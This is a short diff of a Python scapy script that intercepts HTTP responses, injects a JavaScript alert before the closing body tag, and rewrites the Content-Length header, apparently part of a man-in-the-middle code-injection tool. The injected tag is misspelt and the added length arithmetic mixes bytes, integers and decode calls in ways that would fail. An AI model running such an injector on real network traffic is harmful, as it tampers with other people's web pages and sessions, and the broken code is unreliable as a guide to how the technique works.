@@ -27,9 +27,12 @@ def process_packet(packet):
             injection_code = "<scrip>alert('test');</script>"
             load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\\s)(\\d*)", load)
-            if content_length_search:
-                content_length = content_length_search.group(1)
-                print(content_length)
+
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1).encode()
+                new_content_length = content_length + len(injection_code).decode()
+                load = load.replace(content_length, new_content_length).decode()
+                print(new_content_length)
 
         if load != http_packet[scapy.Raw].load:
             new_packet = set_load(http_packet, load)
